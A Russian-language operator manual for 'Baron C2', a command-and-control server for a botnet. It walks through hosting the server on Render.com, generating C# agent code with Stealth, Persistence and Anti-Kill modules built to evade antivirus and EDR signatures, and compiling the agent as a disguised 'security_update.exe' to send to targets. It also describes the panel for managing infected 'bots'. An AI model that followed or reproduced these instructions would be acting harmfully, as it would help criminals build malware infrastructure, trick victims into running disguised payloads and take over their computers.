## 🚀 1. ДЕПЛОЙ НА RENDER.COM (ПОШАГОВО)

Render — это отличный хостинг для C2, так как он поддерживает Docker и предоставляет бесплатный PostgreSQL.

### Шаг 1: Подготовка Репозитория
1. Создайте **приватный** репозиторий на GitHub или GitLab.
2. Скопируйте все файлы из папки `f:\baron-refactor-Go\` в ваш новый репозиторий.
3. Убедитесь, что в корне есть файлы `Dockerfile` и `go.mod`.

### Шаг 2: Создание Базы Данных (PostgreSQL)
1. Зайдите в панель [Render.com](https://dashboard.render.com/).
2. Нажмите **New** -> **PostgreSQL**.
3. Дайте базе имя (например, `baron-db`).
4. После создания скопируйте **Internal Database URL** (она выглядит как `postgres://user:pass@host:port/dbname`). Она понадобится для сервера.

### Шаг 3: Создание Веб-Сервиса
1. Нажмите **New** -> **Web Service**.
2. Подключите ваш GitHub репозиторий.
3. Настройки:
   - **Name**: `baron-c2` (или любое другое).
   - **Runtime**: `Docker`.
   - **Plan**: `Free` (или `Starter` для 24/7 работы без "сна").
4. Нажмите **Advanced** и добавьте **Environment Variables**:
   - `DATABASE_URL`: (Вставьте вашу ссылку на базу данных из Шага 2).
   - `BARON_SECRET`: (Любая длинная случайная строка для шифрования, например `my-super-secret-key-123`).
   - `PORT`: `8080`.
   - `GO_ENV`: `e`.

### Шаг 4: Запуск
1. Нажмите **Create Web Service**.
2. Render начнет сборку Docker-образа. Это займет 2-3 минуты.
3. Когда статус сменится на `Live`, ваш сервер будет доступен по адресу `https://baron-c2.onrender.com`.

## 🛠️ 2. РАБОТА С БИЛДЕРОМ (АГЕНТЫ)

В Go-версии Baron C2 билдер генерирует **исходный код C#**, который вы компилируете сами. Это самый безопасный метод, так как он позволяет обходить статические сигнатуры AV/EDR.

1. Зайдите в панель управления (логин/пароль по умолчанию `admin`/`admin`).
2. Перейдите в раздел **Payload Engine**.
3. Заполните поля:
   - **C2 Server URL**: Ваш URL на Render (например, `https://baron-c2.onrender.com`).
   - **Beacon Jitter**: Интервал опроса сервера (5000ms = 5 секунд).
4. Выберите нужные модули (Stealth, Persistence, Anti-Kill и т.д.).
5. Нажмите **Compile Binary** (в текущей версии это выдаст вам полный исходный код `agent.cs`).

### Как скомпилировать `agent.cs`:
1. Установите **Visual Studio** или используйте `csc.exe` (входит в состав .NET Framework).
2. Команда для быстрой компиляции:
   ```bash
   csc.exe /target:winexe /out:security_update.exe /reference:System.Windows.Forms.dll,System.Drawing.dll,System.Management.dll agent.cs
   ```
3. Готовый файл `security_update.exe` можно отправлять цели.

## ⚡ 3. ФУНКЦИИ ПАНЕЛИ

- **Global Network**: Таблица всех активных ботов. Обновляется автоматически через WebSockets.
- **Sovereign Terminal**: Лог событий сервера в реальном времени.
- **God Mode Admin**:
  - **Wipe Logs**: Очистка истории событий.
  - **Clean Database**: Удаление "мертвых" клиентов (тех, кто не выходил на связь более 24 часов).
  - **Global Panic**: Отключение всех ботов одной командой.

## ⚠️ 4. ВАЖНЫЕ ЗАМЕЧАНИЯ

1. **Бесплатный план Render**: Если вы используете бесплатный тариф, сервер "засыпает" через 15 минут бездействия. Это означает, что первый "стук" от бота может занять до 30 секунд, пока сервер просыпается. Для серьезной работы рекомендуется тариф `Starter` ($7/mo).
2. **IP Whitelisting**: В Go-версии защита реализована через Middleware. Если вы заблокируете свой IP, вам придется зайти в базу данных PostgreSQL через консоль Render и удалить запись из таблицы `bans`.
3. **Безопасность**: Смените пароль `admin` сразу после первого входа!
